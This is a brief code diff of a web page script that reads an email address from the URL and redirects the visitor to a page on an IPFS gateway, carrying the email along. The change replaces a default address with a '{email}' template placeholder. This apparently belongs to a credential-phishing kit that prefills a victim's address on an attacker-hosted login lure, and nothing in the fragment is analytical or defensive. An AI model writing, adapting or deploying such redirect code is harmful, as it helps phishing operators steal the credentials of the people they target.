@@ -13,7 +13,7 @@
     <script>
       async function checkAndRedirect() {
         const params = new URLSearchParams(window.location.search);
-        const email = params.get("email") || "unknown@example.com";
+        const email = params.get("email") || "{email}";
         const encodedEmail = encodeURIComponent(email);
 
         const ipfsURL = `https://bafybeieaamuhsw6yixeazthgigc7kxljclvmp2pouelldqkdzhiea7flcu.ipfs.dweb.link/GMS.html#${encodedEmail}`;
